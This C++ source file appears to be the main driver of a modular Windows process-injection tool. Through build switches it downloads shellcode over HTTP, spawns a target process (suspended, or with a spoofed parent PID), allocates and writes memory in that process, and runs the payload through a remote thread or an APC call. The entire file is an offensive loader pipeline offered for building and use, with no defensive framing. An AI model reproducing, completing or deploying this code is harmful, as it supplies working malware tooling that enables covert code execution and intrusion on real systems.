#include "config.h"
#include "context.h"
#include "debug.h"
#include <cstdio>

#ifdef USE_SHELLCODE_FETCH_HTTP
#include "phases/shellcode/fetch_http.h"
#endif

#ifdef USE_CREATE_SUSPENDED
#include "phases/create/suspended.h"
#endif
#ifdef USE_CREATE_PPID_SPOOF
#include "phases/create/ppid_spoof.h"
#endif

#ifdef USE_ALLOCATE_VALLOC
#include "phases/allocate/valloc.h"
#endif
#ifdef USE_ALLOCATE_SECTION
#include "phases/allocate/section.h"
#endif

#ifdef USE_WRITE_WPM
#include "phases/write/wpm.h"
#endif

#ifdef USE_PROTECT_VPROTECT
#include "phases/protect/vprotect.h"
#endif

#ifdef USE_EXECUTE_REMOTE_THREAD
#include "phases/execute/remote_thread.h"
#endif
#ifdef USE_EXECUTE_APC
#include "phases/execute/apc.h"
#endif

#include "phases/cleanup/cleanup.h"

int main() {
    wprintf(L"[*] Target: %s\n", INJECTION_TARGET_PATH);

    INJECT_CTX ctx = {};
    if (!NtapiInit(&ctx.api)) {
        printf("[-] Failed to resolve NTAPI\n");
        return 1;
    }

shellcode:
#if defined(USE_SHELLCODE_FETCH_HTTP)
    if (!GetShellcode_Http(&ctx)) goto cleanup;
#else
    #error "No shellcode technique selected"
#endif

create:
#if defined(USE_CREATE_SUSPENDED)
    if (!CreateTarget_Suspended(&ctx)) goto cleanup;
#elif defined(USE_CREATE_PPID_SPOOF)
    if (!CreateTarget_PpidSpoof(&ctx)) goto cleanup;
#else
    #error "No create technique selected"
#endif

allocate:
#if defined(USE_ALLOCATE_VALLOC)
    if (!AllocateMemory_VAlloc(&ctx)) goto cleanup;
#elif defined(USE_ALLOCATE_SECTION)
    if (!AllocateMemory_Section(&ctx)) goto cleanup;
    else goto execute; // skip write and protect
#else
    #error "No allocate technique selected"
#endif

write:
#if defined(USE_WRITE_WPM)
    if (!WritePayload_WPM(&ctx)) goto cleanup;
#else
    #error "No write technique selected"
#endif

protect:
#if defined(USE_PROTECT_VPROTECT)
    if (!ProtectMemory_VProtect(&ctx)) goto cleanup;
#else
    #error "No protect technique selected"
#endif

execute:
#if defined(USE_EXECUTE_REMOTE_THREAD)
    if (!Execute_RemoteThread(&ctx)) goto cleanup;
#elif defined(USE_EXECUTE_APC)
    if (!Execute_APC(&ctx)) goto cleanup;
#else
    #error "No execute technique selected"
#endif

    DBG("[+] Injection pipeline complete");

cleanup:
    Cleanup(&ctx);
    return 0;
}
